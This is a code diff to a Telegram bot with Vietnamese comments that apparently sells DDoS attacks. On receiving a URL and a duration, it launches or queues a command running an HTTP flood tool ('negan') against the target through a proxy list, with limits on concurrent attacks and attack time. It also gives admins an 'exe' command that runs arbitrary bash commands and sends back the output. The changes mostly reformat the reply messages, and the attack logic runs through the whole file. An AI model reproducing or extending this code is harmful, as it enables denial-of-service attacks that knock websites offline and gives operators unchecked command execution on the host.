@@ -11,6 +11,10 @@ const maxConcurrentAttacks = 3, maxSlot = 1, maxTimeAttacks = 120;
 const bot = new TelegramBot(token, { polling: true });
 const currentAttacks = new Map(), attackQueue = [];
 
+// Thông báo bot đã sẵn sàng
+bot.sendMessage(adminId, '[Version PRO] 🤖 Bot is ready to receive commands.');
+console.log('[DEBUG] Bot has started and is ready to receive commands.');
+
 // Hàm định dạng thời gian theo múi giờ Việt Nam (GMT+7)
 const getVietnamTime = () => new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
 
@@ -66,25 +70,25 @@ bot.on('message', async (msg) => {
     const username = msg.from.username || msg.from.first_name;
 
     // Kiểm tra quyền thực thi lệnh
-    if (!isAdmin && !isGroup) return sendJsonMessage(chatId, { error: "🚫 Bạn không có quyền thực hiện lệnh này." });
+    if (!isAdmin && !isGroup) return bot.sendMessage(chatId, '🚫 Bạn không có quyền thực hiện lệnh này.', { parse_mode: 'HTML' });
 
     // Xử lý lệnh tấn công (URL + thời gian)
     if (text.startsWith('http://') || text.startsWith('https://')) {
         const [host, time] = text.split(' ');
-        if (!host || isNaN(time)) return sendJsonMessage(chatId, { error: "🚫 Sai định dạng! Nhập theo: <URL> <time>." });
-        if (time > maxTimeAttacks) return sendJsonMessage(chatId, { error: `🚫 Thời gian tối đa là ${maxTimeAttacks} giây.` });
+        if (!host || isNaN(time)) return bot.sendMessage(chatId, '🚫 Sai định dạng! Nhập theo: <URL> <time>.', { parse_mode: 'HTML' });
+        if (time > maxTimeAttacks) return bot.sendMessage(chatId, `🚫 Thời gian tối đa là ${maxTimeAttacks} giây.`, { parse_mode: 'HTML' });
 
         // Kiểm tra số lệnh đang chạy của người dùng
         const userAttacks = Array.from(currentAttacks.values()).filter(attack => attack.user === chatId).length;
         if (userAttacks >= maxSlot) {
             const remainingTime = maxTimeAttacks - (Date.now() - currentAttacks.get(chatId).startTime) / 1000;
-            return sendJsonMessage(chatId, { error: `🚫 Bạn đang có một lệnh chạy. Vui lòng chờ tiến trình hiện tại hoàn tất. Số giây còn lại: ${Math.ceil(remainingTime)} giây.` });
+            return bot.sendMessage(chatId, `🚫 Bạn đang có một lệnh chạy. Vui lòng chờ tiến trình hiện tại hoàn tất. Số giây còn lại: ${Math.ceil(remainingTime)} giây.`, { parse_mode: 'HTML' });
         }
 
         // Kiểm tra số lệnh đang chạy toàn hệ thống
         if (currentAttacks.size >= maxConcurrentAttacks) {
             attackQueue.push({ chatId, command: `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`, host, time, username });
-            return sendJsonMessage(chatId, { status: "⏳ Lệnh của bạn đã được thêm vào hàng đợi. Vui lòng chờ..." });
+            return bot.sendMessage(chatId, '⏳ Lệnh của bạn đã được thêm vào hàng đợi. Vui lòng chờ...', { parse_mode: 'HTML' });
         }
 
         currentAttacks.set(chatId, { user: chatId, command: `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`, startTime: Date.now() });
@@ -95,14 +99,14 @@ bot.on('message', async (msg) => {
     // Xử lý lệnh exe (chỉ admin)
     if (text.startsWith('exe ') && isAdmin) {
         const command = text.slice(4).trim();
-        if (!command) return sendJsonMessage(chatId, { error: "🚫 Lệnh không được để trống. Ví dụ: exe ls" });
+        if (!command) return bot.sendMessage(chatId, '🚫 Lệnh không được để trống. Ví dụ: exe ls', { parse_mode: 'HTML' });
         exec(command, { shell: '/bin/bash' }, (error, stdout, stderr) => {
-            const resultMessage = { status: "🚀Command result🚀", command, output: stdout || stderr };
-            sendJsonMessage(chatId, resultMessage);
+            const resultMessage = `🚀 Command result:\n${command}\n${stdout || stderr}`;
+            bot.sendMessage(chatId, resultMessage, { parse_mode: 'HTML' });
         });
         return;
     }
 
     // Lệnh không hợp lệ
-    sendJsonMessage(chatId, { error: "🚫 Lệnh không hợp lệ. Vui lòng bắt đầu lệnh với 'exe' hoặc nhập URL và thời gian." });
+    bot.sendMessage(chatId, '🚫 Lệnh không hợp lệ. Vui lòng bắt đầu lệnh với "exe" hoặc nhập URL và thời gian.', { parse_mode: 'HTML' });
 });
